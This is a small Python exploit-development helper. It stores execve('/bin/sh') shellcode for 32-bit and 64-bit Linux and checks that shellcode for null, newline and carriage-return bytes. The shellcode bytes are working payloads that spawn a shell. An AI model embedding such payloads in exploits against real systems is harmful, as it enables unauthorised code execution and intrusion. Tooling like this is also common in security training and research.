#!/usr/bin/env python3

def get_shellcode(arch):
    if arch == "32-bit":
        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        return shellcode
    elif arch == "64-bit":
        shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
        return shellcode
    else:
        return None


def check_bad_chars(shellcode, bad_chars):
    check_list = []
    check = False
    print("[*] Checking for bad characters...")
    for i in range(len(shellcode)):
        for j in range(len(bad_chars)):
            if shellcode[i] == bad_chars[j]:
                char = hex(bad_chars[j])
                check_list.append(char)
                check = True
    if not check:
        print("[+] Shellcode is clean!")
        return None
    else:
        print("[-] Shellcode contains bad characters!")
        return check_list


if __name__ == "__main__":
    arch = "32-bit"
    shellcode = get_shellcode(arch)
    if shellcode is not None:
        length = len(shellcode)
        print(f"[*] {arch} shellcode: {length} bytes")
        bad_chars = b"\x00\x0a\x0d"
        check_list = check_bad_chars(shellcode, bad_chars)
        if check_list is not None:
            print("Bad characters in shellcode are: ")
            print(check_list)
